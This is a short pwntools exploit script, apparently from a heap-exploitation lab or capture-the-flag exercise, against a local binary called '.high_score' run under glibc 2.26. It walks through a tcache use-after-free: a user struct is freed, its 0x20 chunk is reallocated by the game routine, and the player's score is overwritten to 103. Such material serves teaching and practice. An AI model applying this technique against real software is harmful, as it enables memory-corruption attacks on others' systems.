from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.26/libc-2.26.so'
env = {}

# Binary setup
elf_name = './.high_score'

elf = ELF(elf_name)
if libc_name != '':
        libc = ELF(libc_name)
        env = {"LD_PRELOAD": libc.path}

# Process creation 
if mode == 'DEBUG':
        p = process([elf.path],env=env)
        gdb.attach(p, gdbscript='''
dir ../../../libc_versions/2.26/
''')


def create(name):
	p.sendlineafter(">", "1")
	p.sendlineafter(":", name)

def reset():
	p.sendlineafter(">", "2") 

def won(): 
	p.sendlineafter(">", "5") 

def play():
	p.sendlineafter(">", "3") 


# Create the user :) <--- Create a 0x20 sized chunk
create("Max") 

'''
Remove the user <---- Free the 0x20 tcache chunk
Triggers the use-after-free (UAF) on the 'struct' used for authorization.

Now, the next 0x20 allocation will use the same chunk. However, there
is a 'dangling pointer' on the player struct. 
'''
reset()

'''
Play the game <--- Reallocates the malloc chunk used in the previous allocation

The 'new' function plays a game that allocates a 'malloc' chunk of size 0x20 tcache chunk.
This will use the SAME allocation from the chunk that we just 'freed'!
This adds the following values to the struct: 
- 100, 101, 102, 103

The FOURTH item of the player struct (player->score) will be set to 103. 
'''
play()

# From the previous allocation, the value of the high_score will be set to 103. 
# This is the NEW high score, of 103. 
won()

p.interactive()
